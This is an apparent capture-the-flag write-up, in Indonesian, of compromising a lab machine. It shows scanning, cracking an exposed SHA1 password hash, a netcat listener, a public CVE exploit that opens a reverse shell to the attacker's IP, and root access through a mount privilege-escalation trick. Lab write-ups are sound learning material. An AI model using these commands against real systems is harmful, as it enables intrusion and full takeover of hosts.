# 11 Jancuk Pristail

## WRITEUP

Pertama di `nmap -sCV 10.10.200.15` lalu didapatkan 2 services
```bash
22 ssh
8080 http
```

Setelah itu kita coba `dirsearch -u 10.10.200.15` dan didapatkan
```bash
/data
/admin
/plugins
/theme
/backups -- FORBIDDEN
```

Setelah itu, kita connect ke 8080 Lalu didapatkan bahwa ternyata pada path `/admin` terdapat login page.

Di `/data/user/ruds.xml` akan didapatkan sebuah username `ruds` dan hash `ef5522daf1a61d8062a50644b96ef0f992242ab6`
Nah habis itu kita decrypt https://md5decrypt.net/en/Sha1/ dan didapatkan password `rumahsakit123` 

### User Flag
Setup listener dengan nc
```bash
nc -nvlp 1235
```

Pake CVE untuk dapat revshell https://www.exploit-db.com/exploits/51475
```bash
python3 CVE-2022-1544.py 10.10.20.15:8080 / 10.18.200.35:1235 ruds 
```

```bash
# /backup/user ada tapi ga guna
ruds
P@ssw0rd
```

Trus kita tinggal 
```bash
su ruds
Password: rumahsakit123
cat /home/ruds/user.txt
```

### Root Flag
cari suid binary untuk permission `find / -perm -u=s -type f 2>/dev/null` Didapatkan `/bin/mount` maka kita gunakan (GTFObins)[https://gtfobins.github.io/gtfobins/mount/]

```bash
sudo mount -o bind /bin/sh /bin/mount
sudo mount

cat /root/root.txt
```
Lokasinya ada di /root/root.txt